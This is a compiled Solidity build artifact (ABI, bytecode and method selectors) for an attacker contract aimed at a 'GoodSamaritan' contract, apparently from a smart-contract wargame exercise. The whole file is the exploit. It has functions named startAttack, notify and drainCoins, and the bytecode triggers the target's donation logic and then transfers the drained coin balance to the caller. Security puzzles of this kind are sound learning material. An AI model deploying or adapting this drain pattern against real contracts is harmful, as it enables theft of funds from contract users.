{"abi":[{"type":"constructor","inputs":[{"name":"goodSamaritanAddr","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"drainCoins","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"notify","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"startAttack","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b506040516104dd3803806104dd83398101604081905261002e91610133565b5f80546001600160a01b0319166001600160a01b03831690811782556040805163521eb27360e01b8152905163521eb273916004808201926020929091908290030181865afa158015610083573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100a79190610133565b90505f816001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100e6573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061010a9190610133565b600180546001600160a01b0319166001600160a01b039290921691909117905550610160915050565b5f60208284031215610143575f5ffd5b81516001600160a01b0381168114610159575f5ffd5b9392505050565b6103708061016d5f395ff3fe608060405260043610610036575f3560e01c8063039356441461004157806377c00de01461005757806398d078b41461006b575f5ffd5b3661003d57005b5f5ffd5b34801561004c575f5ffd5b5061005561008a565b005b348015610062575f5ffd5b506100556101f7565b348015610076575f5ffd5b506100556100853660046102e6565b61026e565b6001546040517f27e235e30000000000000000000000000000000000000000000000000000000081523060048201525f916001600160a01b0316906327e235e390602401602060405180830381865afa1580156100e9573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061010d91906102fd565b90505f811161017c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601160248201527f4e6f20636f696e7320746f20647261696e000000000000000000000000000000604482015260640160405180910390fd5b6001546040517fa9059cbb000000000000000000000000000000000000000000000000000000008152336004820152602481018390526001600160a01b039091169063a9059cbb906044015f604051808303815f87803b1580156101de575f5ffd5b505af11580156101f0573d5f5f3e3d5ffd5b5050505050565b5f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af1158015610247573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061026b9190610314565b50565b5f5f9054906101000a90046001600160a01b03166001600160a01b031663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af11580156102be573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102e29190610314565b5050565b5f602082840312156102f6575f5ffd5b5035919050565b5f6020828403121561030d575f5ffd5b5051919050565b5f60208284031215610324575f5ffd5b81518015158114610333575f5ffd5b939250505056fea2646970667358221220bcedee2a207c95f92d88cb63ffe1868a89f3ba66870f30660a938b43c30a1f2c64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"drainCoins()":"03935644","notify(uint256)":"98d078b4","startAttack()":"77c00de0"},"id":0}